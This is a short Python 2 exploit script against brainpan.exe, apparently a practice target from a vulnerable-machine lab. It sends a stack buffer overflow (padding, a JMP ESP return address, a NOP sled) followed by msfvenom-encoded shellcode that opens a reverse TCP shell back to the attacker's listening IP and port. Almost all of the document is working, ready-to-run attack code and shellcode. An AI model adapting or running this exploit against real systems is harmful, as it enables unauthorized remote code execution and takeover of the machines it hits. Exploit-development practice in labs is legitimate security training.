#!/usr/bin/python
import time
import struct 
import sys
import socket as so

#Command used for Linux Payload.. replace with your IP:
#msfvenom -p linux/x86/shell/reverse_tcp LPORT=4444 LHOST=192.168.1.10 -e x86/shikata_ga_nai -b "\x00" -f py
buf =  ""
buf += "\xbf\x59\x3b\xf5\xef\xd9\xc5\xd9\x74\x24\xf4\x5d\x29"
buf += "\xc9\xb1\x1f\x31\x7d\x15\x03\x7d\x15\x83\xc5\x04\xe2"
buf += "\xac\x51\xff\xb1\x7f\x7d\x08\xae\x2c\xc2\xa4\x5b\xd0"
buf += "\x74\x2c\x15\x35\xb9\x31\xb2\xee\x2a\xf2\x15\x4a\xae"
buf += "\x9a\x67\x6a\xa1\x06\xe1\x8b\xab\xd0\xa9\x1b\x7d\x4a"
buf += "\xc3\x7a\x3e\xb9\x53\xf9\x01\x38\x4d\x4f\xf6\x86\x05"
buf += "\xed\xf6\xf8\xd5\xa9\x9c\xf8\xbf\x4c\xe8\x1a\x0e\x87"
buf += "\x27\x5c\xf4\xd7\xc1\xe0\x1c\xf0\x83\x1c\x5a\xfe\xf3"
buf += "\x22\x9c\x77\x10\xe3\x77\x8b\x16\x07\x8b\x23\xe5\x05"
buf += "\x14\xc6\xd6\xee\x05\x93\x5f\xef\xbf\x95\x6c\x40\xbc"
buf += "\x14\xec\x25\x03\xde\xef\xda\x65\xa6\xf1\x24\x66\xd6"
buf += "\x4a\x25\x66\xd6\xac\xeb\xe6"

#JMP ESP address is 311712F3
payload = "A" * 524 + "\xf3\x12\x17\x31" + (900 - 524 - 4 - int(len(buf))) * "\x90" + buf

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.1.10 9999" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print "\n[+] Attempting to send buffer overflow to brainpan.exe...."
try:   
   s.connect((server,port))
   s.send(payload + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to brainpan.exe. Check your IP address and port"
   sys.exit()
